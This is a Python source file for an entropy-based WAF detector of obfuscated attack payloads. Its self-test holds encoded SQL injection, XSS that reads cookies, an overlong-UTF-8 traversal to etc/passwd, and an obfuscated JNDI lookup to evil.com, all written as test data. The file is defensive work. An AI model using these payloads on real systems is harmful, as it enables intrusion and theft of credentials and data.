#!/usr/bin/env python3
"""
TokioAI Zero-Day Detector — Entropy-Based Obfuscation Analysis
================================================================
Detects obfuscated/encoded attack payloads that bypass traditional regex WAF
signatures. Works by analyzing the statistical properties of the payload
rather than matching known patterns.

Detection layers:
  1. Shannon entropy — obfuscated payloads have high entropy (>4.5)
  2. Encoding layer counter — double/triple encoding detection
  3. Character ratio anomaly — special char vs alphanumeric ratio
  4. Structural anomaly — nested encoding patterns, unusual byte sequences

Performance: O(n) per request, <0.5ms average, zero I/O, zero ML model.
Designed to run inline in the realtime-processor without adding latency.
"""
import math
import re
from collections import Counter
from typing import Dict, List, Optional, Tuple

# ─── Thresholds (tuned for WAF traffic) ──────────────────────────────────────
ENTROPY_SUSPICIOUS = 3.8       # Shannon entropy threshold for suspicious
ENTROPY_MALICIOUS = 4.5        # Shannon entropy threshold for likely malicious
MIN_PAYLOAD_LEN = 15           # Skip analysis for very short payloads
ENCODING_LAYER_THRESHOLD = 2   # >= 2 encoding layers = suspicious
SPECIAL_CHAR_RATIO_THRESHOLD = 0.40  # > 40% special chars = suspicious
COMBINED_SCORE_BLOCK = 0.70    # Combined score >= 0.70 → block recommendation
COMBINED_SCORE_MONITOR = 0.38  # Combined score >= 0.38 → monitor

# ─── Encoding detection patterns ─────────────────────────────────────────────
# Each pattern indicates one layer of encoding/obfuscation
ENCODING_PATTERNS = [
    # Dense URL encoding: many %XX sequences (>=4 in a row = suspicious)
    (r"(%[0-9a-fA-F]{2}){4,}", "dense_url_encode", 0.5),
    # Double URL encoding: %25XX (encoding the % itself)
    (r"%25[0-9a-fA-F]{2}", "double_url_encode", 0.7),
    # Triple URL encoding: %2525XX
    (r"%2525[0-9a-fA-F]{2}", "triple_url_encode", 0.6),
    # Unicode escapes: \uXXXX
    (r"\\u[0-9a-fA-F]{4}", "unicode_escape", 0.35),
    # Hex encoding: \xXX or 0xXX
    (r"(\\x[0-9a-fA-F]{2}|0x[0-9a-fA-F]{2})", "hex_encode", 0.35),
    # HTML entities: &#xXX; or &#NNN;
    (r"(&#x[0-9a-fA-F]+;|&#\d{2,};)", "html_entity", 0.3),
    # Base64 chunks (at least 12 chars of base64 alphabet, often with = padding)
    (r"[A-Za-z0-9+/]{12,}={0,3}", "base64_chunk", 0.5),
    # JNDI obfuscation: ${lower:x}${lower:y}
    (r"\$\{[a-z]+:[^}]{1,3}\}", "jndi_obfuscation", 0.6),
    # PHP wrappers with encoding
    (r"php://filter/.*convert\.", "php_filter_chain", 0.5),
    # Overlong UTF-8: %c0%ae = '.'
    (r"%c[01]%[89a-f][0-9a-f]", "overlong_utf8", 0.6),
    # Null bytes
    (r"%00|\\0|\\x00", "null_byte", 0.4),
    # Mixed case evasion with concat: co/**/ncat, un/**/ion
    (r"/\*.*?\*/", "sql_comment_obfuscation", 0.3),
    # String.fromCharCode or chr() chains (even 2+ args is suspicious)
    (r"(fromCharCode|chr)\s*\(\s*\d+(\s*,\s*\d+){2,}", "charcode_obfuscation", 0.6),
    # Decimal/Octal IP encoding: http://0x7f.0x0.0x0.0x1
    (r"(0x[0-9a-f]{1,8}\.){1,3}0x[0-9a-f]{1,8}", "hex_ip", 0.4),
    # Tab/newline injection in keywords: sel%09ect, un%0aion
    (r"%0[9aAdD]", "whitespace_obfuscation", 0.35),
]

# Pre-compile all patterns for performance
_COMPILED_PATTERNS = [(re.compile(p, re.IGNORECASE), name, weight)
                       for p, name, weight in ENCODING_PATTERNS]

# Normal traffic character distribution (empirically derived from web logs)
NORMAL_BIGRAM_ENTROPY = 3.8  # typical bigram entropy for normal URIs


def shannon_entropy(data: str) -> float:
    """Calculate Shannon entropy of a string. O(n) time."""
    if not data:
        return 0.0
    length = len(data)
    counts = Counter(data)
    entropy = 0.0
    for count in counts.values():
        if count == 0:
            continue
        freq = count / length
        entropy -= freq * math.log2(freq)
    return round(entropy, 4)


def bigram_entropy(data: str) -> float:
    """Calculate entropy of character bigrams. Detects unusual byte patterns."""
    if len(data) < 4:
        return 0.0
    bigrams = [data[i:i+2] for i in range(len(data) - 1)]
    length = len(bigrams)
    counts = Counter(bigrams)
    entropy = 0.0
    for count in counts.values():
        freq = count / length
        entropy -= freq * math.log2(freq)
    return round(entropy, 4)


def count_encoding_layers(payload: str) -> Tuple[int, List[str], float]:
    """
    Detect encoding/obfuscation layers in the payload.
    Returns (layer_count, detected_types, weighted_score).
    """
    detected = []
    total_weight = 0.0

    for compiled_re, name, weight in _COMPILED_PATTERNS:
        matches = compiled_re.findall(payload)
        if matches:
            detected.append(name)
            # Weight scales with number of matches (capped)
            match_factor = min(len(matches), 5) / 5.0
            total_weight += weight * (0.5 + 0.5 * match_factor)

    return len(detected), detected, round(min(total_weight, 1.0), 4)


def special_char_ratio(payload: str) -> float:
    """Calculate ratio of special/non-printable chars vs alphanumeric."""
    if not payload:
        return 0.0
    alnum = sum(1 for c in payload if c.isalnum())
    total = len(payload)
    # Ratio of non-alphanumeric characters
    return round(1.0 - (alnum / total), 4) if total > 0 else 0.0


def url_encoding_density(payload: str) -> float:
    """
    Calculate what percentage of the payload is URL-encoded (%XX sequences).
    Normal URLs have 0-5% encoding. Attack payloads often have 30-80%+.
    """
    if not payload:
        return 0.0
    encoded_chars = len(re.findall(r"%[0-9a-fA-F]{2}", payload))
    # Each %XX represents 3 chars in the string but 1 logical char
    encoded_length = encoded_chars * 3
    return round(encoded_length / len(payload), 4) if len(payload) > 0 else 0.0


def structural_depth(payload: str) -> int:
    """Measure nesting depth of encoding structures."""
    depth = 0
    max_depth = 0
    openers = {"(", "{", "[", "<"}
    closers = {")", "}", "]", ">"}
    for c in payload:
        if c in openers:
            depth += 1
            max_depth = max(max_depth, depth)
        elif c in closers:
            depth = max(0, depth - 1)
    return max_depth


def analyze_payload(uri: str, user_agent: str = "",
                    body: str = "") -> Optional[Dict]:
    """
    Main analysis function. Analyzes URI (+ optionally UA and body)
    for signs of obfuscated zero-day payloads.

    Returns None if payload is clean, or a dict with analysis results
    if suspicious/malicious obfuscation is detected.

    Performance: <0.5ms for typical payloads.
    """
    # Determine the most suspicious part of the request to analyze
    raw_uri = uri or ""
    if user_agent:
        raw_uri += " " + user_agent

    if len(raw_uri) < MIN_PAYLOAD_LEN:
        return None

    # Skip obviously safe static paths
    safe_prefixes = ("/static/", "/css/", "/js/", "/img/",
                     "/fonts/", "/favicon", "/.well-known/")
    path_part = raw_uri.split("?")[0].split(" ")[0]
    if any(path_part.startswith(p) for p in safe_prefixes):
        if "?" not in (uri or ""):
            return None

    # Analyze the most "interesting" part:
    # 1. If there's a query string, analyze it separately (higher signal)
    # 2. If the path itself looks encoded, analyze the path
    # 3. Analyze the full URI
    # Pick the segment with highest encoding density
    segments = [raw_uri]  # always analyze full URI

    if "?" in (uri or ""):
        qs = uri.split("?", 1)[1]
        if len(qs) >= 10:
            segments.append(qs)

    # Check if path itself is heavily encoded
    path_only = (uri or "").split("?")[0]
    pct_count = path_only.count("%")
    if pct_count >= 3 and len(path_only) >= 10:
        segments.append(path_only)

    # Analyze each segment, keep the one with highest score
    best_result = None
    best_score = 0

    for payload in segments:
        if len(payload) < MIN_PAYLOAD_LEN:
            continue
        result = _analyze_segment(payload)
        if result and result["confidence"] > best_score:
            best_score = result["confidence"]
            best_result = result

    return best_result


def _analyze_segment(payload: str) -> Optional[Dict]:
    """Analyze a single payload segment for obfuscation indicators."""

    # ─── Layer 1: Shannon Entropy ─────────────────────────────────────────
    ent = shannon_entropy(payload)
    bi_ent = bigram_entropy(payload)

    # ─── Layer 2: Encoding Layers ─────────────────────────────────────────
    layers, encoding_types, encoding_weight = count_encoding_layers(payload)

    # ─── Layer 3: Character Ratio ─────────────────────────────────────────
    spec_ratio = special_char_ratio(payload)

    # ─── Layer 4: Structural Depth ────────────────────────────────────────
    depth = structural_depth(payload)

    # ─── Layer 5: URL-Encoding Density ────────────────────────────────────
    url_density = url_encoding_density(payload)

    # ─── Combined Score Calculation ───────────────────────────────────────
    score = 0.0

    # Entropy contribution (20% weight)
    if ent >= ENTROPY_MALICIOUS:
        score += 0.20
    elif ent >= ENTROPY_SUSPICIOUS:
        score += 0.20 * ((ent - ENTROPY_SUSPICIOUS) /
                         (ENTROPY_MALICIOUS - ENTROPY_SUSPICIOUS))

    # Encoding layers contribution (30% weight)
    score += encoding_weight * 0.30

    # URL-encoding density (30% weight — key obfuscation signal)
    # Normal: 0-10%, suspicious: 25%+, heavy: 50%+, full: 80%+
    if url_density > 0.80:
        score += 0.30  # Almost fully encoded = definitely obfuscated
    elif url_density > 0.50:
        score += 0.25
    elif url_density > 0.25:
        score += 0.30 * ((url_density - 0.25) / 0.55)

    # Special char ratio contribution (10% weight)
    if spec_ratio > SPECIAL_CHAR_RATIO_THRESHOLD:
        ratio_factor = min(1.0, (spec_ratio - SPECIAL_CHAR_RATIO_THRESHOLD) /
                           (1.0 - SPECIAL_CHAR_RATIO_THRESHOLD))
        score += ratio_factor * 0.10

    # Bigram entropy anomaly (10% weight)
    if bi_ent > NORMAL_BIGRAM_ENTROPY + 0.5:
        score += 0.10

    # Structural depth bonus (5% weight)
    if depth >= 3:
        score += 0.05

    score = round(min(1.0, score), 4)

    # ─── Decision ─────────────────────────────────────────────────────────
    if score < COMBINED_SCORE_MONITOR:
        return None  # Clean or too low to flag

    # Determine severity and action
    if score >= COMBINED_SCORE_BLOCK:
        severity = "critical"
        action = "block_ip"
        sig_id = "ZD-0001"
    elif score >= 0.65:
        severity = "high"
        action = "block_ip"
        sig_id = "ZD-0002"
    else:
        severity = "medium"
        action = "monitor"
        sig_id = "ZD-0003"

    return {
        "sig_id": sig_id,
        "threat_type": "ZERO_DAY_OBFUSCATED",
        "severity": severity,
        "action": action,
        "confidence": score,
        "entropy": ent,
        "bigram_entropy": bi_ent,
        "encoding_layers": layers,
        "encoding_types": encoding_types,
        "encoding_weight": encoding_weight,
        "special_char_ratio": spec_ratio,
        "url_encoding_density": url_density,
        "structural_depth": depth,
        "payload_length": len(payload),
        "analysis_summary": _build_summary(ent, layers, encoding_types,
                                            spec_ratio, depth, score,
                                            url_density),
    }


def _build_summary(entropy: float, layers: int, encoding_types: List[str],
                    spec_ratio: float, depth: int, score: float,
                    url_density: float = 0.0) -> str:
    """Build human-readable analysis summary."""
    parts = []
    if entropy >= ENTROPY_MALICIOUS:
        parts.append(f"HIGH entropy ({entropy:.2f})")
    elif entropy >= ENTROPY_SUSPICIOUS:
        parts.append(f"elevated entropy ({entropy:.2f})")

    if layers > 0:
        types_str = ", ".join(encoding_types[:4])
        parts.append(f"{layers} encoding layers ({types_str})")

    if spec_ratio > SPECIAL_CHAR_RATIO_THRESHOLD:
        parts.append(f"special char ratio {spec_ratio:.0%}")

    if url_density > 0.25:
        parts.append(f"URL-encoding density {url_density:.0%}")

    if depth >= 3:
        parts.append(f"nesting depth {depth}")

    return f"Zero-day candidate (score={score:.0%}): " + "; ".join(parts)


# ─── Quick benchmark / self-test ──────────────────────────────────────────────
if __name__ == "__main__":
    import time

    test_cases = [
        # Clean traffic
        ("/index.html", "Clean path", False),
        ("/api/users?page=1&limit=10", "Clean API call", False),
        ("/products/search?q=laptop+gaming", "Clean search", False),

        # Known attacks (should be caught by regex WAF, but also by us)
        ("/' OR 1=1--", "Basic SQLi", False),  # too short

        # Obfuscated attacks (THIS is what we catch that regex misses)
        ("/%25%32%37%25%32%30OR%25%32%30%25%33%31%25%33%44%25%33%31%25%32%44%25%32%44",
         "Double-encoded SQLi", True),

        ("/search?q=%24%7Blower%3Aj%7D%24%7Blower%3An%7D%24%7Blower%3Ad%7D%24%7Blower%3Ai%7D%3A%2F%2Fevil.com",
         "JNDI obfuscation", True),

        ("/page?data=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
         "Base64 encoded XSS", True),

        ("/path?file=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
         "Overlong UTF-8 path traversal", True),

        ("/api?cmd=String.fromCharCode(115,121,115,116,101,109,40,39,108,115,39,41)",
         "CharCode obfuscation", True),

        ("/vuln?input=%00%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%2a%20%46%52%4f%4d%20%75%73%65%72%73%2d%2d",
         "Null byte + hex SQLi", True),

        # Mixed encoding attack
        ("/page?x=<%73%63%72%69%70%74>alert(document[%22\\x63\\x6f\\x6f\\x6b\\x69\\x65\"])</%73%63%72%69%70%74>",
         "Multi-layer XSS", True),
    ]

    print("=" * 75)
    print("TokioAI Zero-Day Entropy Detector — Self Test")
    print("=" * 75)

    total_time = 0
    passed = 0
    total = 0

    for payload, desc, should_detect in test_cases:
        start = time.perf_counter_ns()
        result = analyze_payload(payload)
        elapsed_us = (time.perf_counter_ns() - start) / 1000

        total_time += elapsed_us
        detected = result is not None
        total += 1

        if should_detect:
            status = "PASS" if detected else "FAIL"
        else:
            status = "PASS" if not detected else "FALSE+"

        if status == "PASS":
            passed += 1

        score_str = f"{result['confidence']:.0%}" if result else "clean"
        entropy_str = f"ent={result['entropy']:.2f}" if result else ""
        layers_str = f"layers={result['encoding_layers']}" if result else ""

        print(f"  [{status:5s}] {desc:40s} | {score_str:6s} {entropy_str} {layers_str} | {elapsed_us:.0f}us")

        if result and result.get("analysis_summary"):
            print(f"          -> {result['analysis_summary']}")

    avg_us = total_time / len(test_cases)
    print(f"\n  Results: {passed}/{total} passed | Avg: {avg_us:.0f}us/payload")
    print(f"  Performance: {1_000_000/avg_us:.0f} payloads/sec")
